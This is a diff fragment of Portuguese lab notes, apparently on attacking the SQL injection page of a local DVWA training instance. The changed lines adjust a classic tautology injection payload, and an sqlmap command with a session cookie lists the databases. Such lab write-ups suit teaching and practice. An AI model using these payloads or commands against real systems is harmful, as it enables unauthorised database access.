@@ -37,7 +37,7 @@ senha: `password`
 
 ## Execução do Ataque
 
-`1' OR '1'='1' --`
+`1' OR '1'='1`
 
 `sqlmap -u "http://10.0.2.2:2080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxxx" --dbs`
 
